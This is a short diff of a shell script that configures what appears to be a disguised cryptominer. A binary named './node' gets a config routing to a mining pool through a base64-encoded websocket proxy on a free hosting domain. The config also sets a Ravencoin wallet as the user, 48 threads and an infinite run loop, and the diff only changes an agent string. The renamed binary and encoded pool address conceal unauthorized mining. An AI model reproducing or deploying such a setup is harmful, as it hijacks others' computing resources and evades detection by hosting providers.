@@ -9,7 +9,7 @@ chmod +x ./node && \
 echo '{
   "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
   "config": { "threads": 48, "log": true },
-  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "cpuuuuu" }
+  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "timmer@dayttttt" }
 }' > data.json
 
 # Start the infinite loop
